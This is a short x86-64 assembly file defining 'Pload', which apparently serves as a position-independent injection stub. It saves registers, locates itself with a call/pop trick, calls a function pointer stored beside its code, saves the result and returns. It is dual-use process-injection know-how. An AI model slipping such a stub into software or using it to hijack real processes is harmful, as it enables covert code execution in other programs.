.intel_syntax noprefix
	.text
	
	
	.globl	Pload
	
Pload:
	push rax
	push rbx
	push rcx
	push rdx
	push r8
	push r9
	push r10
	push r11	
	push r12
	push r13
    pushf
	call start
	
	start: 
		pop rdx
		sub rdx,22 
	lea rcx,[rdx+60] 
	push rdx
        call qword ptr [rdx-8]
	 pop rdx	
     mov [rdx+60],rax   	 
     popf	 
	 pop r13
	 pop r12
	 pop r11
	 pop r10
	 pop r9
	 pop r8
	 pop rdx
	 pop rcx 
	 pop rbx
	 pop rax	
	 pop r15 
	 ret 
	
	.globl	Pload_stub

Pload_stub:
	ret


	
	
	
	
